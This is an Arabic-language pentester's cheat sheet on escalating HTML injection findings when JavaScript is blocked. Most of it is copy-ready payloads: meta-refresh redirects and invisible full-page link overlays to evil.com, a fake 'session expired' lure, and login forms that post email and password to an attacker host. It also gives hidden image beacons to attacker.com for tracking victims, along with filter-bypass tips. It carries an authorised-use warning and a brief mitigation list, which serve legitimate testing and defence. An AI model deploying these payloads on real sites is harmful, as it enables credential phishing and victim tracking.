---
title: "HTML Injection — Escalation Tricks"
tag: WEB
labels: HTMLI, PHISHING
date: "2026-09-22"
tags:
  - web
  - html-injection
  - phishing
---

# HTML Injection — Escalation Tricks

!!! danger "للاستخدام المصرّح به بس"
    كل الأمثلة هنا بأدومينات وهمية (`evil.com`, `attacker.com`). استخدامها على أنظمة من غير إذن كتابي (bug bounty scope / pentest agreement) جريمة يعاقب عليها القانون. النوتس دي لرفع تأثير finding موجود فعلًا ومصرّح باختباره.

> نوتس شغل — تقنيات بستخدمها لرفع تأثير ثغرات HTML Injection لما الـ payload بيتقبل بس مفيش تنفيذ JS مباشر (فلترة CSP/XSS قوية).

## 1️⃣ Auto Redirect (Zero Click)

```html
<!-- Instant redirect -->
<meta http-equiv="refresh" content="0;url=//evil.com">

<!-- Delayed redirect (bypass detection / looks legit) -->
<meta http-equiv="refresh" content="3;url=//evil.com">
```

- `http-equiv="refresh"` → تقول للمتصفح يعمل refresh
- `content="0;url=..."`:
    - `0` = التأخير بالثواني
    - `url` = الوجهة
- بعض الفلاتر بتبلوك `https://` و`http://` بس مش بتبلوك `//`

بمجرد ما الصفحة تحمل → بتعمل redirect لـ `evil.com`.

!!! note "ليه `//` شغالة"
    `//evil.com` هو protocol-relative URL — المتصفح بياخد نفس البروتوكول بتاع الصفحة الحالية (http أو https) ويحطه قبل الدومين تلقائيًا. فلاتر كتير بتدور على النص `http://`/`https://` حرفيًا وبتفوّت الشكل ده.

## 2️⃣ Full-page Overlay لحجب الواجهة

```html
<div style="position:fixed;inset:0;background:#fff;z-index:9999"></div>
<div style="position:absolute;inset:0;background:#fff;z-index:9999"></div>
<div style="position:fixed;inset:0;opacity:0;z-index:9999"></div> <!-- Invisible overlay -->
```

- `fixed` → بيغطي الشاشة كلها دايمًا ✅
- `absolute` → بيتموضع نسبة لأقرب عنصر أب عنده `position`؛ لو مفيش → نسبة للصفحة
- `inset:0` → بيمد العنصر لكل الحواف
- `background:#fff` → بيخفي الصفحة الحقيقية
- `z-index:9999` → فوق أي حاجة تانية

!!! tip "ملاحظة"
    استخدم `position:fixed` دايمًا كخيار أول. لو اتفلتر، استخدم `absolute`. لو `inset` اتفلتر، استخدم `top:0;left:0;width:100%;height:100%`. لو `opacity:0` اتفلتر، استخدم `background:transparent`.

## 3️⃣ Blur للصفحة اللي تحت

```html
<style>body{filter:blur(8px)}</style>
```

## 4️⃣ Redirect بضغطة واحدة

```html
<a href='//evil.com'><h1>SECURITY ALERT: SESSION EXPIRED<br>Click here to re-login and save your work<br>CLICK HERE TO CONTINUE</h1></a>
```

## 5️⃣ Full Attack (كليك في أي مكان)

```html
<a href="//evil.com" style="position:fixed;inset:0;z-index:9999"></a>
<a href="//evil.com" style="display:block;width:100vw;height:100vh;background:white"></a>
```

!!! tip "ملاحظة"
    لو `position:fixed;inset:0` اتفلتر، استخدم `display:block;width:100vw;height:100vh` — ده بيشتغل كمان في سياقات Markdown اللي الـ payloads التانية بتفشل فيها.

## 6️⃣ استخدام Internal Image URLs لتجاوز قيود SOP

```html
<a href='//evil.com'>
  <h1>Click on Image</h1>
  <img src="INTERNAL_IMAGE_URL" width="1400">
</a>
```

الصورة بتتحمل من نفس الأصل (origin)، وده بيتجاوز القيود المتعلقة بالموارد الخارجية.

## 7️⃣ Phishing Form بسيط

```html
<form action="//evil.com">
  <input placeholder="Password" style="padding:6px;border:1px solid #ccc;border-radius:4px">
  <button style="padding:6px;background:#07f;color:#fff;border:0;border-radius:4px">Login</button>
</form>
```

```html
<!-- Fake login form -->
<form action="//evil.com">
  <input name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button>Login</button>
</form>
```

## 8️⃣ Hidden Request (Tracking / Blind HTMLI)

```html
<img src='//attacker.com/log' style='display:none'> <!-- use iplogger -->
<img src='//BURP-COLLABORATOR' style='display:none'>
```

بيبعت request أوتوماتيك لسيرفر المهاجم بمجرد تحميل الصفحة. Use cases:

- تأكيد وجود HTML Injection
- تتبع الضحية (IP, وقت, user-agent)
- اختبار SSRF / تفاعلات خارجية

!!! tip "أداة سريعة"
    استخدم **Burp Collaborator** (أو webhook.site / interact.sh كبدائل) بدل دومين وهمي — بيديك DNS/HTTP interaction log فوري تتأكد بيه إن الـ payload اتنفذ فعلًا قبل ما تصعّد للخطوة اللي بعدها.

## Exploitation Workflow

```mermaid
flowchart TD
    A[Find HTML Injection point] --> B{JS تنفيذ متاح؟}
    B -- لا, CSP يمنع --> C[استخدم meta refresh<br/>أو overlay trick]
    B -- أيوه --> Z[روح لـ XSS مباشرة]
    C --> D[بناء fake login form]
    D --> E[Redirect لصفحة تجميع بيانات]
    E --> F[تأكيد عن طريق Burp Collaborator]
    F --> G[توثيق الـ impact في التقرير]
```

## Detection & Mitigation

نقط أساسية بتقفل الفئة دي من التقنيات، للمرجعية:

- **CSP** صارم مع `frame-ancestors` و`default-src 'self'` بيمنع تحميل overlays/forms لدومينات خارجية
- **Sanitize** أي مدخل بيترجع في الصفحة كـ HTML خام (allow-list مش block-list)
- منع `<meta http-equiv="refresh">` و`<form>` و`<a>` جوه أي مكان بيتقبل فيه مدخل مستخدم غير موثوق
- **X-Frame-Options / frame-ancestors** يقلل من قابلية استغلال overlay-based clickjacking
- Rate-limit وmonitor على أي outbound request غير متوقعة (بتساعد تكتشف الـ blind HTMLI بتاع تقنية 8)
